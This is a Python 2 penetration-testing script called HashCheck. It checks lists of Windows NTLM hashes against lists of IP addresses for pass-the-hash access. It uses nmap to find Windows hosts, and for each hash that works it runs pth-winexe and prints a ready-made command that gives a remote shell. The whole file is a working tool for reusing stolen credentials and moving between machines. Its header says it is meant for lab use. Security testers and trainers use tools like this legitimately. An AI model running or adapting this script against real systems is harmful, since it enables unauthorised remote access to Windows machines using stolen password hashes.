#!/usr/bin/python

###################################################
#
#   HashCheck - written by Justin Ohneiser
# ------------------------------------------------
# This program will check a set of Windows NTLM
# hashes against a set of IP addresses looking
# for valid Pass-The-Hash access.
#
# [Warning]:
# This script comes as-is with no promise of functionality or accuracy.  I strictly wrote it for personal use
# I have no plans to maintain updates, I did not write it to be efficient and in some cases you may find the
# functions may not produce the desired results so use at your own risk/discretion. I wrote this script to
# target machines in a lab environment so please only use it against systems for which you have permission!!
#-------------------------------------------------------------------------------------------------------------
# [Modification, Distribution, and Attribution]:
# You are free to modify and/or distribute this script as you wish.  I only ask that you maintain original
# author attribution and not attempt to sell it or incorporate it into any commercial offering (as if it's
# worth anything anyway :)
#
# Hashes must be in the following format
#   USER:ID:LM:NT:::
#
# Designed for use in Kali Linux 4.6.0-kali1-686
###################################################

import os, sys, subprocess

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# ------------------------------------
#       Toolbox
# ------------------------------------

def printHeader():
    print ""
    print "###################################################"
    print "##   HashCheck"
    print "##"
    print "###################################################"
    print ""

def printUsage():
    print "Usage: \t\t%s <hash | hash-file> <target | target-file>\nHash Format:\tUSER:ID:LM:NT:::" % sys.argv[0].split("/")[len(sys.argv[0].split("/"))-1]

def printPlus(message):
    print bcolors.OKGREEN + "[+] " + message + bcolors.ENDC

def printMinus(message):
    print "[-] " + message

def printStd(message):
    print "[*] " + message

def printStdSpecial(message):
    print bcolors.WARNING + "[*] " + message + bcolors.ENDC

def printErr(message):
    print bcolors.FAIL + "[!] " + message + bcolors.ENDC

def printDbg(message):
    print bcolors.OKBLUE + "[-] " + message + bcolors.ENDC

def validateIp(s):
    a = s.split('.')
    if len(a) != 4:
        return False
    for x in a:
        if not x.isdigit():
            return False
        i = int(x)
        if i < 0 or i > 255:
            return False
    return True

def validateHash(hash):
    pieces = hash.split(":")
    if len(pieces) < 4:
        return False
    if "NO PASSWORD" in pieces[3] or "0000000000" in pieces[3]:
        return False
    return True

# ------------------------------------
#       Scans
# ------------------------------------

def isWindows(target):
    NMAP = "nmap -p 445 --script smb-os-discovery %s | grep OS:" % target
    try:
        nmap_results = subprocess.check_output(NMAP, shell=True)
        if not "Windows" in nmap_results:
            printStd("Skipping: hash login not accessible")
            return False
    except KeyboardInterrupt:
        printMinus("Skipping:\n\t%s" % NMAP)
        return False
    except subprocess.CalledProcessError as ex:
        if ex.returncode != 1:
            raise Exception
        printStd("Skipping: hash login not accessible")
        return False
    except Exception as e:
        printErr("Unable to discover target compatibility:\n\t%s\n\n%s" % (NMAP, e))
        return False
    return True

def hashpass(user, lm, nt, target):
    WINEXE = "pth-winexe -U %s%%%s:%s --uninstall //%s whoami 2>&1" % (user, lm, nt, target)
    try:
        winexe_results = subprocess.check_output(WINEXE, shell=True)
        if not "ERROR" in winexe_results:
            return True
    except KeyboardInterrupt:
        printMinus("Skipping:\n\t%s" % WINEXE)
        return False
    except subprocess.CalledProcessError as e:
        return False
    except Exception as e:
        printErr("Unable to pass the hash:\n\t%s\n\n%s" % (WINEXE, e))
        return False
    return False

def check(hashes, targets):
    for target in targets:
        printStdSpecial("Checking %s" % target)
        if isWindows(target):
            for hash in hashes:
                hashParts = hash.split(":")
                user = hashParts[0]
                lm = hashParts[2]
                if "NO PASSWORD" in lm or "0000000000" in lm:
                    lm = "AAD3B435B51404EEAAD3B435B51404EE"
                nt = hashParts[3]
                if hashpass(user, lm, nt, target):
                    printPlus("pth-winexe -U %s%%%s:%s --uninstall //%s cmd" % (user, lm, nt, target))
                else:
                    printMinus("%s:%s:%s" % (user, lm, nt))

# ------------------------------------
#       Main
# ------------------------------------

def main(argv):
    if len(sys.argv) != 3:
        printUsage()
        sys.exit(2)
    
    # Validate Hashes
    
    HASHES = []
    if os.path.isfile(sys.argv[1]):
        with open(sys.argv[1]) as f:
            for line in f:
                if not validateHash(line.strip()):
                    printErr("Invalid hash format: %s" % line.strip())
                    continue
                HASHES.append(line.strip())
    else:
        if not validateHash(sys.argv[1]):
            printErr("Invalid hash format: %s" % sys.argv[1])
            printUsage()
            sys.exit(2)
        HASHES = [sys.argv[1]]

    # Validate Targets

    TARGETS = []
    if os.path.isfile(sys.argv[2]):
        with open(sys.argv[2]) as f:
            for line in f:
                if not validateIp(line.strip()):
                    printErr("Invalid target format: %s" % line.strip())
                    continue
                TARGETS.append(line.strip())
    else:
        if not validateIp(sys.argv[2]):
            printErr("Invalid target format: %s" % sys.argv[2])
            printUsage()
            sys.exit(2)
        TARGETS = [sys.argv[2]]
    
    # Begin

    printHeader()

    try:
        check(HASHES, TARGETS)
    except KeyboardInterrupt:
        print "\n\nExiting.\n"
        sys.exit(1)

if __name__ == "__main__":
    main(sys.argv[1:])
